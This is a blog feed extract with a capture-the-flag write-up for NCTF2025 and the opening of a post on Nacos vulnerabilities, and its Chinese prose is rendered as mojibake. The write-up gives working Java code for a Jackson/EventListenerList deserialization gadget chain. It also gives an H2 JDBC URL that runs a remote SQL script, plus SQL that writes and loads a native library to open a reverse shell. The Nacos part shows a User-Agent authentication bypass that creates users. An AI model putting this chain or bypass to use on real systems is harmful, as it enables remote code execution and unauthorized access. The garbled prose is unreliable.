class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// å°†TemplatesImplæ”¹æˆMyDataSource</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8008/poc.sql&#x27;&quot;</span>;<br>        <span class="hljs-type">MyDataSource</span> <span class="hljs-variable">myDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(url,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(myDataSource);<br><span class="hljs-comment">//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">// è¿™é‡Œè¦æ”¹æˆé«˜ç‰ˆæœ¬åå°„èµ‹å€¼valæ‰è¡Œï¼Œä¸èƒ½ç›´æ¥æ„é€ å‡½æ•°æ¥è®¾ç½®ï¼Œå› ä¸ºæ„é€ å‡½æ•°æ˜¯ä½¿ç”¨çš„val.toString()æ¥è®¾ç½®çš„</span><br>        Class&lt;?&gt; unSafe=Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>);<br>        Field unSafeField=unSafe.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unSafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unSafeClass= (Unsafe) unSafeField.get(<span class="hljs-literal">null</span>);<span class="hljs-comment">//è·å–Unsafeå®ä¾‹</span><br>        <span class="hljs-comment">//è·å–ClassLoaderçš„module</span><br>        Module baseModule=Object.class.getModule();<br>        <span class="hljs-comment">//æ›´æ”¹å½“å‰è¿è¡Œç±»çš„Module</span><br>        Class&lt;?&gt; currentClass= exp.class;<br>        <span class="hljs-type">long</span> addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unSafeClass.getAndSetObject(currentClass,addr,baseModule);<br>        <span class="hljs-comment">//ç°åœ¨å°±èƒ½æ­£å¸¸åå°„äº†</span><br><span class="hljs-comment">//        setValue(val,&quot;val&quot;,jsonNodes);</span><br>        <span class="hljs-comment">// EventListener</span><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonNodes);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(eventListenerList);<br>        <span class="hljs-comment">// æ‰“å°base64çš„payload</span><br>        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>            <span class="hljs-keyword">if</span> ( field != <span class="hljs-literal">null</span> )<br>                field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( clazz.getSuperclass() != <span class="hljs-literal">null</span> )<br>                field = getField(clazz.getSuperclass(), fieldName);<br><br>            <span class="hljs-keyword">return</span> field;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( NoSuchFieldException e ) &#123;<br>            <span class="hljs-keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;<br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324202437910.png" alt="image-20250324202437910"></p><p>ç„¶åæœ¬åœ°èµ·ä¸ªç¯å¢ƒå»æ‰“ä¸€ä¸‹è¯•è¯•</p><blockquote><p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹MyDataSourceçš„åŒ…åè¦å’Œé¢˜ç›®ä¸€è‡´ï¼Œä¸ç„¶ä¼šNot Found</p></blockquote><p>ä½†æ˜¯ä»–å¤±è´¥äº†ï¼Œæ¥çœ‹ä¸€ä¸‹dockerçš„æŠ¥é”™</p><p><img src="https://cdn.clown2024.cn/image-20250324203353164.png" alt="image-20250324203353164"></p><p>è¿™é‡Œæ¥äº†ä¸€ä¸ªæ²¡æœ‰javacé¡¹ç›®ï¼Œå¾ˆå¥‡æ€ªï¼Œå»çœ‹ä¸€ä¸‹dockerfile</p><p><img src="https://cdn.clown2024.cn/image-20250324203911814.png" alt="image-20250324203911814"></p><p>è¿™é‡Œæ˜¯åªæ„å»ºäº†ä¸€ä¸ªjreçš„ç¯å¢ƒï¼Œé—®äº†ä¸€ä¸‹ds</p><p><img src="https://cdn.clown2024.cn/image-20250324204029549.png" alt="image-20250324204029549"></p><p>å› ä¸ºç¨‹åºå°è¯•æ‰§è¡Œjavacæ‰€ä»¥å¯¼è‡´äº†è¯¥é—®é¢˜ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆä¼šè¿è¡Œjavacå‘¢ï¼Œè¿™æ˜¯å› ä¸ºH2åœ¨åˆå§‹åŒ–æ‰§è¡Œçš„é‚£ä¸ªsqlé‡Œçš„javaä»£ç æ˜¯åŠ¨æ€ç¼–è¯‘çš„ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œjavacï¼Œç„¶åå¯ä»¥ç¿»å‡ºé¢˜äººçš„åšå®¢æ‰¾åˆ°è§£å†³æ–¹æ¡ˆğŸ˜Š</p><p><a href="https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce">https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce</a></p><p><img src="https://cdn.clown2024.cn/image-20250324205843602.png" alt="image-20250324205843602"></p><p>é‡Œé¢æåˆ°</p><blockquote><p>H2 çš„ CREATE ALIAS ä»ç„¶å¯ä»¥è°ƒç”¨ä½äº classpath å†…çš„æŸä¸ªå…¬å…±ç±»çš„å…¬å…±é™æ€æ–¹æ³•, è¿™ç‚¹ä¸ Oracle ç±»ä¼¼</p></blockquote><p>æ„æ€å°±æ˜¯å¯ä»¥ç›´æ¥ç»‘å®šä¸€ä¸ªé™æ€æ–¹æ³•ç„¶åè°ƒç”¨ï¼Œè€Œä¸æ˜¯å†…è”javaä»£ç ï¼Œè¿™æ ·å°±ä¸éœ€è¦åŠ¨æ€ç¼–è¯‘ï¼Œé—®äº†dsç»™å‡ºçš„ç¤ºä¾‹å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20250325152213840.png" alt="image-20250325152213840"></p><p>æ‰€ä»¥æ–‡ç« å°±ç»™å‡ºäº†ä¸¤ç§æ€è·¯</p><p><img src="https://cdn.clown2024.cn/image-20250325160043356.png" alt="image-20250325160043356"></p><blockquote><p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹æƒ³é‚£ç›´æ¥å‘½ä»¤æ‰§è¡Œä¸å°±å¯ä»¥äº†å—ï¼Œjava.lang.Runtime.getRuntime()ä¹Ÿæ˜¯é™æ€æ–¹æ³•ï¼Œæ–‡ç« ä¸­æåˆ°ï¼Œåœ¨ H2 ä¸­, Java çš„ java.lang.Object ç±»å‹å¯¹åº”æ•°æ®åº“çš„ <code>JAVA_OBJECT</code> ç±»å‹ï¼Œæ€»ç»“å°±æ˜¯JAVA_OBJECTå¯¹åº”çš„å¯¹è±¡ä¸€å®šæ˜¯è¦å¯åºåˆ—åŒ–çš„</p></blockquote><p>ä½†æ˜¯è¿™ä¸¤ç§æ€è·¯çš„é¢å¤–ä¾èµ–æˆ‘éƒ½æ²¡æœ‰ï¼Œéœ€è¦æ‰¾æ‰¾æœ‰æ²¡æœ‰å…¶ä»–é™æ€å†™æ–‡ä»¶çš„é™æ€æ–¹æ³•</p><p>è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªåŸç”Ÿ<code>java.nio.file.Files</code> ç±»çš„ <code>write</code> æ–¹æ³•</p><p>ä½†æ˜¯è¿™é‡Œwriteæ–¹æ³•éœ€è¦ä¼ é€’Fileç±»å‹çš„å‚æ•°ï¼Œæ‰€ä»¥è¿˜è¦æ‰¾ä¸€ä¸ªé™æ€æ–¹æ³•è¿”å›Fileçš„ï¼Œè¿™é‡Œæ‰¾åˆ°File.createTempFile()æ–¹æ³•</p><p>æ¥ä¸‹æ¥éœ€è¦å†æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè°ƒç”¨å®ä¾‹æ–¹æ³•çš„é™æ€æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦Fileçš„getAbsoluteFileæ–¹æ³•æ¥è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œè¿™é‡Œæ˜¯Springç¯å¢ƒï¼Œå¯ä»¥æ‰¾åˆ°ReflectionUtils.findMethodæ–¹æ³•æ¥è·å–Methodï¼Œæ‰¾åˆ°ReflectionUtils.invokeMethodæ¥è°ƒç”¨Method</p><p>è¿™é‡Œè¿˜æåˆ°äº†ä¸€ä¸ªé—®é¢˜</p><p><img src="https://cdn.clown2024.cn/image-20250325233703045.png" alt="image-20250325233703045"></p><p>å› ä¸ºè™½ç„¶getAbsolutePathè¿”å›çš„æ˜¯Stringï¼Œä½†æ˜¯æˆ‘ä»¬æ˜¯é€šè¿‡ReflectionUtils.invokeMethodæ¥è°ƒç”¨çš„ï¼Œä»–é»˜è®¤è¿”å›çš„å°±æ˜¯Objectï¼Œæˆ‘è¿™é‡Œå°±æ‰¾åˆ°é™æ€æ–¹æ³•String.valueOfå¯ä»¥å°†å…¶è½¬æ¢æˆStringï¼Œç„¶åå°±å¯ä»¥System.loadäº†</p><p>æœ€ååœ¨javaä»£ç ä¸­å†™å‡ºæ¥çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><br><span class="hljs-keyword">import</span> com.google.common.io.Files;<br><span class="hljs-keyword">import</span> org.springframework.util.ReflectionUtils;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// é™æ€åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„æ–¹æ³•</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> File.createTempFile(<span class="hljs-string">&quot;exp&quot;</span>, <span class="hljs-string">&quot;.so&quot;</span>);<br>        <span class="hljs-comment">// é™æ€å†™æ–‡ä»¶çš„æ–¹æ³•</span><br>        Files.write(<span class="hljs-string">&quot;test&quot;</span>.getBytes(), file);<br>        System.out.println(file.getAbsolutePath());<br>        <span class="hljs-comment">// è¿˜æœ‰æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè°ƒç”¨å®ä¾‹æ–¹æ³•çš„é™æ€æ–¹æ³•ï¼Œè¿™é‡Œæ‰¾åˆ°springä¾èµ–ä¸‹çš„åˆ©ç”¨</span><br>        <span class="hljs-comment">// å…ˆæ‰¾åˆ°æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(File.class, <span class="hljs-string">&quot;getAbsoluteFile&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// ç„¶åè°ƒç”¨getAbsoluteFile</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pathObject</span> <span class="hljs-operator">=</span> ReflectionUtils.invokeMethod(method, file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> String.valueOf(pathObject);<br>        <span class="hljs-comment">// è°ƒç”¨System.load</span><br>        System.load(path);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åè¦æ³¨æ„ç¼–è¯‘å‡ºæ¥çš„ .so æ¯”è¾ƒå¤§, è½¬æˆ Hex åå­—ç¬¦ä¸²çš„é•¿åº¦è¿‡é•¿, ç›´æ¥å†™ä¼šæŠ¥é”™, éœ€è¦åˆ†å—å†™å…¥ã€‚</p><p>ç„¶åè¿™é‡Œé—®ä¸€ä¸‹deepseek h2æ€ä¹ˆå°†å†…å®¹è½¬æ¢æˆå­—èŠ‚ï¼Œå› ä¸ºwriteæ–¹æ³•åªæ¥å—å­—èŠ‚ï¼Œç„¶åå§é—®äº†ä¹‹åå‘ç°ï¼Œh2å¯ä»¥ä¹‹æ¥å†™æ–‡ä»¶ï¼Œé‚£æˆ‘ä¸Šé¢å†™çš„è¿™ä¹ˆå¤šç›´æ¥å°±ä¸éœ€è¦äº†ã€‚ã€‚ã€‚ã€‚</p><p><img src="https://cdn.clown2024.cn/image-20250326001852639.png" alt="image-20250326001852639"></p><p>è¿™ç›´æ¥å†™å°±å®Œäº‹äº†ã€‚ã€‚ã€‚</p><p>ä½†æ˜¯ä¸Šé¢åˆ†æäº†è¿™ä¹ˆå¤šä¸èƒ½æµªè´¹ï¼Œç¡¬ç€å¤´çš®ä¹Ÿå¾—å†™ä¸‹å»ï¼Œç°åœ¨å†æ‰¾ä¸€ä¸ªèƒ½å¤Ÿç”¨é™æ€æ–¹æ³•è½¬æ¢æˆå­—èŠ‚æ•°ç»„çš„ï¼Œè¿™é‡Œåœ¨javaä¸­æ²¡æœ‰ç›´æ¥æ‰¾åˆ°ç›¸å…³ï¼Œç„¶åè¿™é‡Œè½¬æ¢äº†ä¸€ä¸‹æ€è·¯ï¼Œé‡‡ç”¨base64è§£ç çš„å½¢å¼æ¥è¿›è¡Œè½¬æ¢ï¼Œç„¶åä¸­é—´å°±ä¼šåˆç»è¿‡å¥½å‡ ä¸ªæ­¥éª¤</p><p>ç»è¿‡ä¸€ç•ªå°è¯•ï¼Œæœ€ç»ˆè¿˜æ˜¯å¤±è´¥äº†ï¼Œå¡åœ¨äº†Stringè½¬æˆå­—èŠ‚æ•°ç»„çš„éƒ¨åˆ†ï¼Œæ”¾ä¸ªå¤±è´¥çš„javaä»£ç ğŸ˜­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.NCTF2025;<br><br><span class="hljs-keyword">import</span> com.google.common.io.Files;<br><span class="hljs-keyword">import</span> org.springframework.util.ReflectionUtils;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// é™æ€åˆ›å»ºä¸´æ—¶æ–‡ä»¶çš„æ–¹æ³•</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> File.createTempFile(<span class="hljs-string">&quot;exp&quot;</span>, <span class="hljs-string">&quot;.so&quot;</span>);<br>        <span class="hljs-comment">// è°ƒç”¨é™æ€æ–¹æ³•è·å–decoder</span><br>        Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>        <span class="hljs-comment">// è·å–å®ä¾‹æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">decode</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(Base64.Decoder.class, <span class="hljs-string">&quot;decode&quot;</span>, String.class);<br>        <span class="hljs-comment">// è°ƒç”¨å®ä¾‹æ–¹æ³•</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">soObject</span> <span class="hljs-operator">=</span> ReflectionUtils.invokeMethod(decode, decoder, <span class="hljs-string">&quot;&lt;.soçš„base64å½¢å¼&gt;&quot;</span>);<br>        <span class="hljs-comment">// è½¬æ¢æˆå­—èŠ‚</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">soString</span> <span class="hljs-operator">=</span> String.valueOf(soObject);<br>        <span class="hljs-comment">// è½¬ä¸è¿‡æ¥äº†ï¼Œå¤±è´¥äº†ã€‚ã€‚ã€‚ã€‚</span><br>        <span class="hljs-type">Byte</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> Byte.valueOf(soString);<br>        <span class="hljs-comment">// é™æ€å†™æ–‡ä»¶çš„æ–¹æ³•</span><br>        Files.write(<span class="hljs-string">&quot;test&quot;</span>.getBytes(), file);<br>        System.out.println(file.getAbsolutePath());<br>        <span class="hljs-comment">// è¿˜æœ‰æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè°ƒç”¨å®ä¾‹æ–¹æ³•çš„é™æ€æ–¹æ³•ï¼Œè¿™é‡Œæ‰¾åˆ°springä¾èµ–ä¸‹çš„åˆ©ç”¨</span><br>        <span class="hljs-comment">// å…ˆæ‰¾åˆ°æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(File.class, <span class="hljs-string">&quot;getAbsoluteFile&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// ç„¶åè°ƒç”¨getAbsoluteFile</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">pathObject</span> <span class="hljs-operator">=</span> ReflectionUtils.invokeMethod(method, file);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> String.valueOf(pathObject);<br>        <span class="hljs-comment">// è°ƒç”¨System.load</span><br>        System.load(path);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±è¿˜æ˜¯ç›´æ¥ç”¨h2è‡ªå¸¦çš„å‡½æ•°æ¥å†™æ–‡ä»¶å§</p><p>è¯•äº†ä¸€ä¸‹WRITE_FILEå‡½æ•°ä¸å¯¹ï¼Œå†é—®ä¸€ä¸‹deepseek</p><p><img src="https://cdn.clown2024.cn/image-20250326105035567.png" alt="image-20250326105035567"></p><p>emmmå…¶å®è¿™ç»™çš„å‡½æ•°è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œå‚æ•°ä½ç½®åäº†</p><p>é‚£æœ€ç»ˆå†™æˆçš„sqlå¦‚ä¸‹ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- å†™æ–‡ä»¶</span><br><span class="hljs-keyword">CALL</span> FILE_WRITE(X<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>);<br><span class="hljs-comment">-- å¼•å…¥System.loadæ–¹æ³•</span><br><span class="hljs-keyword">CREATE</span> ALIAS SYS_LOAD <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;java.lang.System.load(java.lang.String)&#x27;</span>;<br><span class="hljs-comment">-- è°ƒç”¨loadæ–¹æ³•ï¼Œåå¼¹shell</span><br><span class="hljs-keyword">CALL</span> SYS_LOAD(<span class="hljs-string">&#x27;/tmp/exp.so&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>å¯ä»¥ç”¨xxd -på‘½ä»¤ç”Ÿæˆçº¯åå…­è¿›åˆ¶å­—ç¬¦ï¼ŒåŠ ä¸Štr -d â€˜\nâ€™å‘½ä»¤å»é™¤æ¢è¡Œç¬¦</p></blockquote><p>ä½†æ˜¯è¿™é‡Œæˆ‘å‰é¢çš„java expåˆå‡ºé—®é¢˜äº†ï¼Œè¿è¡Œä¹‹åä»–ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/image-20250326214307800.png" alt="image-20250326214307800"></p><p>å¤§è‡´è¯´çš„æ˜¯æœªæ‰¾åˆ°java.lang.Objectçš„åºåˆ—åŒ–å™¨ï¼Œemmmè¿™å°±å¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆä¼šå‘ç”Ÿä¸èƒ½åºåˆ—åŒ–çš„æƒ…å†µå‘¢ï¼ŒåŸæ¥çš„å¼¹è®¡ç®—å™¨çš„sqlåœ¨æœ¬åœ°ä¹Ÿæ˜¯èƒ½æ­£å¸¸æ‰§è¡Œçš„ï¼Œè€Œä¸”çœ‹æ—¥å¿—å‰é¢å·²ç»æˆåŠŸæ‰§è¡Œäº†System.loadäº†</p><p>éš¾èšŒåæ¥å‘ç°è¿™åªèƒ½æ‰“ä¸€æ¬¡ï¼Œæ‰“å®Œä¹‹åè¦é‡å¯é¶æœºæ‰è¡ŒğŸ˜“</p><p>æœ€ååå¼¹shellè¿‡æ¥ï¼Œæ”¹ä¸€ä¸‹flagçš„æƒé™å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20250326204304609.png" alt="image-20250326204304609"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½“æ—¶æ²¡æ€ä¹ˆæ‰“ï¼Œç°åœ¨æ¥å¤ç°ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å­¦åˆ°è›®å¤šä¸œè¥¿&lt;/p&gt;
&lt;h1 id=&quot;internal_api&quot;&gt;&lt;a href=&quot;#internal-api&quot; class=&quot;headerlink&quot; title=&quot;internal_api&quot;&gt;&lt;/a&gt;internal_api&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    <category term="é¢˜ç›®å¤ç°" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nacosæ¼æ´å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2025/03/02/Nacos%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-03-02T13:44:14.000Z</published>
    <updated>2025-03-31T09:47:07.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨çœ‹Javaå¾®æœåŠ¡ç›¸å…³çš„çŸ¥è¯†ï¼Œé‚£å°±é¡ºä¾¿å­¦ä¸€ä¸‹Nacosç›¸å…³çš„æ¼æ´</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>NACOSçš„å®˜ç½‘ï¼š<a href="https://nacos.io/">https://nacos.io/</a></p><p>Nacos æ˜¯ Dynamic Naming and Configuration Serviceçš„é¦–å­—æ¯ç®€ç§°ï¼Œä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ã€‚</p><h1 id="æœªæˆæƒè®¿é—®æ¼æ´cve-2021-29441"><a href="#æœªæˆæƒè®¿é—®æ¼æ´-CVE-2021-29441" class="headerlink" title="æœªæˆæƒè®¿é—®æ¼æ´(CVE-2021-29441)"></a>æœªæˆæƒè®¿é—®æ¼æ´(CVE-2021-29441)</h1><p><strong>å½±å“ç‰ˆæœ¬</strong></p><p>Nacos &lt;&#x3D; 2.0.0-ALPHA.1æˆ–è€…&lt;&#x3D;1.4.0</p><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p>nacosåœ¨è¿›è¡Œè®¤è¯æˆæƒæ“ä½œæ—¶ï¼Œä¼šåˆ¤æ–­è¯·æ±‚çš„user-agentæ˜¯å¦ä¸ºâ€Nacos-Serverâ€ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™ä¸è¿›è¡Œä»»ä½•è®¤è¯ã€‚</p><p><strong>å¤ç°</strong></p><p>è¿™é‡Œç›´æ¥ç”¨vulhubçš„ç¯å¢ƒå³å¯</p><p>è®¿é—®nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9æ¥å£</p><p><img src="https://cdn.clown2024.cn/image-20250308163045149.png" alt="image-20250308163045149"></p><p>æ­£å¸¸æ¥è¯´è®¿é—®æ˜¯403çš„ï¼Œæˆ‘ä»¬UAå¤´åŠ ä¸ŠNacos-Serverå°±å¯ä»¥ç»•è¿‡éªŒè¯ï¼Œæ­¤æ—¶å°±ä¸º200äº†</p><p><img src="https://cdn.clown2024.cn/image-20250308163418761.png" alt="image-20250308163418761"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥POSTè®¿é—®nacos&#x2F;v1&#x2F;auth&#x2F;usersæ¥å£ï¼Œbodyä¸ºusername&#x3D;clown&amp;password&#x3D;clownï¼Œæ·»åŠ 